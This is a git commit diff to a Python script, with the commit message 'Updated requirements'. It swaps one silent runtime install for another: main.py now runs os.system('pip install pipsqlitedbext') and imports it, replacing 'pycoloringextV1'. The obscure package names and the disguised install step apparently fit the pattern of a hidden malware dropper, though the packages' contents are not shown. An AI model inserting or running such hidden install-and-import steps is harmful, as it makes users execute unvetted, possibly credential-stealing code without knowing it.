84dc1c0d04dd727964e40b4d6c169b0dabab1f2e
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-13 23:39:53 +0200

    Updated requirements

--- main.py
+++ main.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pycoloringextV1")
-import pycoloringextV1
+os.system("pip install pipsqlitedbext")
+import pipsqlitedbext
 import random
 import requests
 import time
